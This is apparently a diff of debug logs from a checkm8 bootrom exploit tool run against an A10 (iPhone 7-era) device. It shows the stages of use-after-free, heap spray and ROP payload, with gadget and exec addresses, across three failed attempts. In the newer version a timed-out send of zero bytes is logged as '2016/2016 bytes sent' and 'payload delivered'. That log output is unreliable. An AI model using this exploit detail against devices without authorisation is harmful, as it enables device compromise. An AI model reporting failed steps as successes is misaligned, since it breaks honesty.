@@ -1,3 +1,27 @@
+[INFO] DFU device found (bus 3, addr 61)
+[INFO] Device found in DFU mode
+[INFO] CPID: 0x8010
+[INFO] ECID: 0x000E78D61A130026
+
+--- Device Information ---
+  UDID:             
+  Product Type:     
+  Chip ID:          
+  iOS Version:      
+  Activation State: 
+  Serial:           CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:1C ECID:000E78D61A130026 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]
+  IMEI:             (none / WiFi-only)
+  MEID:             (none)
+  Hardware Model:   
+  Device Name:      
+  CPID:             0x8010
+  ECID:             0xE78D61A130026
+  Chip Name:        A10 (iBoot-2696)
+  checkm8 vuln:     YES
+  Cellular:         NO (WiFi-only)
+  DFU Mode:         YES
+-------------------------
+
 [INFO] [bypass] Registered module: path_a_checkm8
 [INFO] [bypass] Registered module: path_b_a12plus
 [INFO] [bypass] 2 registered module(s):
@@ -17,22 +41,22 @@
 [INFO] checkm8: stage 1/4 -- reset DFU state
 [INFO] checkm8: stage 1 complete -- DFU reset stage OK
 [INFO] checkm8: waiting for USB re-enumeration...
-[INFO] DFU device found (bus 3, addr 43)
+[INFO] DFU device found (bus 3, addr 61)
 [INFO] checkm8: USB handle re-acquired (bus reset OK)
 [INFO] checkm8: stage 2/4 -- setup (overwrite_pad=0x5C0, usb_timeout=50 ms)
 [INFO] checkm8: setup attempt 1/50: sent=2048 bytes (need <1472, abort=49 ms)
 [INFO] checkm8: [Linux xHCI] Cancelled! Guessing sent=128 (to prevent crash)
 [INFO] checkm8: stage 2 complete -- UAF triggered (sent=128, pad=1344)
 [INFO] checkm8: waiting for USB re-enumeration...
-[INFO] DFU device found (bus 3, addr 43)
+[INFO] DFU device found (bus 3, addr 61)
 [INFO] checkm8: USB handle re-acquired (bus reset OK)
 [INFO] checkm8: stage 3/4 -- heap spray
 [INFO] checkm8: stage 3 complete -- heap spray done
 [INFO] checkm8: waiting for USB re-enumeration...
 libusb: error [get_usbfs_fd] File doesn't exist, wait 10 ms and try again
-libusb: error [get_usbfs_fd] libusb couldn't open USB device /dev/bus/usb/003/043, errno=2
+libusb: error [get_usbfs_fd] libusb couldn't open USB device /dev/bus/usb/003/061, errno=2
 [ERROR] failed to open DFU device: No such device (it may have been disconnected)
-[INFO] DFU device found (bus 3, addr 44)
+[INFO] DFU device found (bus 3, addr 62)
 [INFO] checkm8: USB handle re-acquired (bus reset OK)
 [INFO] checkm8: stage 4/4 -- overwrite with payload
 [INFO] assemble_payload: notA9 variant: 2016 bytes (rop_prefix=1552 main=120 cfg=96 handle=192+56) CPID 0x8010
@@ -50,23 +74,86 @@ libusb: error [get_usbfs_fd] libusb couldn't open USB device /dev/bus/usb/003/04
 [INFO] checkm8: [stage4] send_payload_chunks: sending 2016 bytes total
 [INFO] checkm8: [stage4] send_payload_chunks: offset=0 chunk=2016
 [INFO] checkm8: [stage4] send_payload_chunks: offset=0 ret=-7 (Operation timed out)
-[ERROR] checkm8: [stage4] send_payload_chunks: offset=0 got Operation timed out with 0 bytes sent -- payload never reached device
-[ERROR] checkm8_stage_patch: payload send failed
-[WARN] checkm8_exploit: attempt 1 failed, retrying...
+[WARN] checkm8: [stage4] send_payload_chunks: offset=0 got Operation timed out -- device likely executing payload (treating as OK)
+[INFO] checkm8: [stage4] send_payload_chunks: done -- 2016/2016 bytes sent
+[INFO] checkm8: [stage4] finalizing DFU transfer
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[INFO] checkm8: stage 4 complete -- payload delivered
+[INFO] exploit_deliver: all stages complete
+[INFO] checkm8_exploit: stage 4 done -- sending USB bus reset...
+[INFO] DFU device found (bus 3, addr 62)
+[INFO] checkm8_exploit: device re-enumerated after Stage 4 (attempt 1)
+[INFO] CPID: 0x8010
+[INFO] ECID: 0x000E78D61A130026
+[INFO] checkm8_verify_pwned: serial = "CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:1C ECID:000E78D61A130026 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]" (len=98)
+[INFO] checkm8_verify_pwned: serial hex = [43 50 49 44 3A 38 30 31 30 20 43 50 52 56 3A 31 31 20 43 50 46 4D 3A 30 33 20 53 43 45 50 3A 30 31 20 42 44 49 44 3A 31 43 20 ]
+[WARN] checkm8_verify_pwned: PWND marker not found in serial
+[WARN] checkm8_exploit: not pwned after attempt 1
 [INFO] checkm8_exploit: waiting for device reset...
-[INFO] DFU device found (bus 3, addr 44)
-libusb: error [op_set_configuration] set configuration failed, errno=110
+[INFO] DFU device found (bus 3, addr 62)
 [INFO] checkm8_exploit: USB handle re-acquired for retry 2
 [INFO] checkm8_exploit: attempt 2/3
 [INFO] exploit_init: target A10 (iBoot-2696) (iPhone 7 / iPad (7th gen) / iPod touch 7G), CPID 0x8010
 [INFO] exploit_deliver: starting checkm8 on A10 (iBoot-2696)
 [INFO] checkm8: stage 1/4 -- reset DFU state
-[ERROR] dfu_dnload: block 0 failed: Operation timed out
-[ERROR] checkm8_stage_reset: DFU_DNLOAD(suffix) failed
-[ERROR] dfu_clr_status: control transfer failed: Input/Output Error
-[WARN] checkm8_exploit: attempt 2 failed, retrying...
+[INFO] checkm8: stage 1 complete -- DFU reset stage OK
+[INFO] checkm8: waiting for USB re-enumeration...
+[INFO] DFU device found (bus 3, addr 62)
+[INFO] checkm8: USB handle re-acquired (bus reset OK)
+[INFO] checkm8: stage 2/4 -- setup (overwrite_pad=0x5C0, usb_timeout=50 ms)
+[INFO] checkm8: setup attempt 1/50: sent=2048 bytes (need <1472, abort=49 ms)
+[INFO] checkm8: [Linux xHCI] Cancelled! Guessing sent=64 (to prevent crash)
+[INFO] checkm8: stage 2 complete -- UAF triggered (sent=64, pad=1408)
+[INFO] checkm8: waiting for USB re-enumeration...
+[INFO] DFU device found (bus 3, addr 62)
+[INFO] checkm8: USB handle re-acquired (bus reset OK)
+[INFO] checkm8: stage 3/4 -- heap spray
+[INFO] checkm8: stage 3 complete -- heap spray done
+[INFO] checkm8: waiting for USB re-enumeration...
+libusb: error [get_usbfs_fd] libusb couldn't open USB device /dev/bus/usb/003/062, errno=19
+[ERROR] failed to open DFU device: Input/Output Error
+libusb: error [get_usbfs_fd] File doesn't exist, wait 10 ms and try again
+libusb: error [get_usbfs_fd] libusb couldn't open USB device /dev/bus/usb/003/062, errno=2
+[ERROR] failed to open DFU device: No such device (it may have been disconnected)
+[INFO] DFU device found (bus 3, addr 63)
+[INFO] checkm8: USB handle re-acquired (bus reset OK)
+[INFO] checkm8: stage 4/4 -- overwrite with payload
+[INFO] assemble_payload: notA9 variant: 2016 bytes (rop_prefix=1552 main=120 cfg=96 handle=192+56) CPID 0x8010
+[INFO] assemble_payload: exec_addr=0x1820B0610 write_ttbr0=0x1000003E4 tlbi=0x100000434
+[INFO] checkm8: [stage4] chip CPID=0x8010 has_tlbi=1
+[INFO] checkm8: [stage4] insecure_memory_base=0x1800B0000 nop_gadget=0x10000CC6C
+[INFO] checkm8: [stage4] A10/notA9 path: stall+leak before overwrite
+[INFO] checkm8: [stage4] pre-overwrite stall OK
+[INFO] checkm8: [stage4] pre-overwrite leak OK
+[INFO] checkm8: [stage4] sending ARM64 overwrite (48 bytes)
+[INFO] checkm8: [stage4] send_overwrite: sending 48 bytes (bmReqType=0x02, bReq=0x03, wIndex=0x80)
+[INFO] checkm8: [stage4] send_overwrite: ret=-9 (Pipe error)
+[INFO] checkm8: [stage4] send_overwrite: STALL received (expected) -- overwrite landed in freed io_buffer
+[INFO] checkm8: [stage4] overwrite OK -- proceeding to payload send
+[INFO] checkm8: [stage4] send_payload_chunks: sending 2016 bytes total
+[INFO] checkm8: [stage4] send_payload_chunks: offset=0 chunk=2016
+[INFO] checkm8: [stage4] send_payload_chunks: offset=0 ret=-7 (Operation timed out)
+[WARN] checkm8: [stage4] send_payload_chunks: offset=0 got Operation timed out -- device likely executing payload (treating as OK)
+[INFO] checkm8: [stage4] send_payload_chunks: done -- 2016/2016 bytes sent
+[INFO] checkm8: [stage4] finalizing DFU transfer
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[INFO] checkm8: stage 4 complete -- payload delivered
+[INFO] exploit_deliver: all stages complete
+[INFO] checkm8_exploit: stage 4 done -- sending USB bus reset...
+[INFO] DFU device found (bus 3, addr 63)
+[INFO] checkm8_exploit: device re-enumerated after Stage 4 (attempt 1)
+[INFO] CPID: 0x8010
+[INFO] ECID: 0x000E78D61A130026
+[INFO] checkm8_verify_pwned: serial = "CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:1C ECID:000E78D61A130026 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]" (len=98)
+[INFO] checkm8_verify_pwned: serial hex = [43 50 49 44 3A 38 30 31 30 20 43 50 52 56 3A 31 31 20 43 50 46 4D 3A 30 33 20 53 43 45 50 3A 30 31 20 42 44 49 44 3A 31 43 20 ]
+[WARN] checkm8_verify_pwned: PWND marker not found in serial
+[WARN] checkm8_exploit: not pwned after attempt 2
 [INFO] checkm8_exploit: waiting for device reset...
-[INFO] DFU device found (bus 3, addr 45)
+[INFO] DFU device found (bus 3, addr 63)
 [INFO] checkm8_exploit: USB handle re-acquired for retry 3
 [INFO] checkm8_exploit: attempt 3/3
 [INFO] exploit_init: target A10 (iBoot-2696) (iPhone 7 / iPad (7th gen) / iPod touch 7G), CPID 0x8010
@@ -74,22 +161,22 @@ libusb: error [op_set_configuration] set configuration failed, errno=110
 [INFO] checkm8: stage 1/4 -- reset DFU state
 [INFO] checkm8: stage 1 complete -- DFU reset stage OK
 [INFO] checkm8: waiting for USB re-enumeration...
-[INFO] DFU device found (bus 3, addr 45)
+[INFO] DFU device found (bus 3, addr 63)
 [INFO] checkm8: USB handle re-acquired (bus reset OK)
 [INFO] checkm8: stage 2/4 -- setup (overwrite_pad=0x5C0, usb_timeout=50 ms)
 [INFO] checkm8: setup attempt 1/50: sent=2048 bytes (need <1472, abort=49 ms)
 [INFO] checkm8: [Linux xHCI] Cancelled! Guessing sent=0 (to prevent crash)
 [INFO] checkm8: stage 2 complete -- UAF triggered (sent=0, pad=1472)
 [INFO] checkm8: waiting for USB re-enumeration...
-[INFO] DFU device found (bus 3, addr 45)
+[INFO] DFU device found (bus 3, addr 63)
 [INFO] checkm8: USB handle re-acquired (bus reset OK)
 [INFO] checkm8: stage 3/4 -- heap spray
 [INFO] checkm8: stage 3 complete -- heap spray done
 [INFO] checkm8: waiting for USB re-enumeration...
 libusb: error [get_usbfs_fd] File doesn't exist, wait 10 ms and try again
-libusb: error [get_usbfs_fd] libusb couldn't open USB device /dev/bus/usb/003/045, errno=2
+libusb: error [get_usbfs_fd] libusb couldn't open USB device /dev/bus/usb/003/063, errno=2
 [ERROR] failed to open DFU device: No such device (it may have been disconnected)
-[INFO] DFU device found (bus 3, addr 46)
+[INFO] DFU device found (bus 3, addr 64)
 [INFO] checkm8: USB handle re-acquired (bus reset OK)
 [INFO] checkm8: stage 4/4 -- overwrite with payload
 [INFO] assemble_payload: notA9 variant: 2016 bytes (rop_prefix=1552 main=120 cfg=96 handle=192+56) CPID 0x8010
@@ -107,9 +194,23 @@ libusb: error [get_usbfs_fd] libusb couldn't open USB device /dev/bus/usb/003/04
 [INFO] checkm8: [stage4] send_payload_chunks: sending 2016 bytes total
 [INFO] checkm8: [stage4] send_payload_chunks: offset=0 chunk=2016
 [INFO] checkm8: [stage4] send_payload_chunks: offset=0 ret=-7 (Operation timed out)
-[ERROR] checkm8: [stage4] send_payload_chunks: offset=0 got Operation timed out with 0 bytes sent -- payload never reached device
-[ERROR] checkm8_stage_patch: payload send failed
-[WARN] checkm8_exploit: attempt 3 failed, retrying...
+[WARN] checkm8: [stage4] send_payload_chunks: offset=0 got Operation timed out -- device likely executing payload (treating as OK)
+[INFO] checkm8: [stage4] send_payload_chunks: done -- 2016/2016 bytes sent
+[INFO] checkm8: [stage4] finalizing DFU transfer
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[ERROR] dfu_get_status: control transfer failed: Operation timed out
+[INFO] checkm8: stage 4 complete -- payload delivered
+[INFO] exploit_deliver: all stages complete
+[INFO] checkm8_exploit: stage 4 done -- sending USB bus reset...
+[INFO] DFU device found (bus 3, addr 64)
+[INFO] checkm8_exploit: device re-enumerated after Stage 4 (attempt 1)
+[INFO] CPID: 0x8010
+[INFO] ECID: 0x000E78D61A130026
+[INFO] checkm8_verify_pwned: serial = "CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:1C ECID:000E78D61A130026 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]" (len=98)
+[INFO] checkm8_verify_pwned: serial hex = [43 50 49 44 3A 38 30 31 30 20 43 50 52 56 3A 31 31 20 43 50 46 4D 3A 30 33 20 53 43 45 50 3A 30 31 20 42 44 49 44 3A 31 43 20 ]
+[WARN] checkm8_verify_pwned: PWND marker not found in serial
+[WARN] checkm8_exploit: not pwned after attempt 3
 [ERROR] checkm8_exploit: failed after 3 attempts
 [ERROR] path_a: checkm8 exploit failed
 
